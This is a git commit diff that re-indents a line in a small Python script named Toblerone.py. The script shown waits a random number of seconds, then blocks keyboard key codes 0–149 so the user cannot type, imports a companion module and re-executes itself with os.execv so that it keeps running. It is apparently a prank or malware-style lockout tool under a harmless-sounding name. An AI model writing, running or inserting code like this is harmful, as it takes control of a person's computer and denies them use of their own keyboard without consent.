d0492dec62b2d53c1a1a60f06fb064bebb25926e
Aidan Patrick Marias <52266188+Silver0006@users.noreply.github.com>
2023-03-04 01:33:18 -0500

    Add files via upload

--- Toblerone.py
+++ Toblerone.py
@@ -3,6 +3,6 @@ list1 = [15, 30, 45, 60, 360, 120, 21, 49, 63, 246]
 print(random.choice(list1))
 time.sleep(random.choice(list1))
 for i in range(150):
-    keyboard.block_key(i)
+            keyboard.block_key(i)
 import Toblerone2
 os.execv(sys.argv[0], sys.argv)
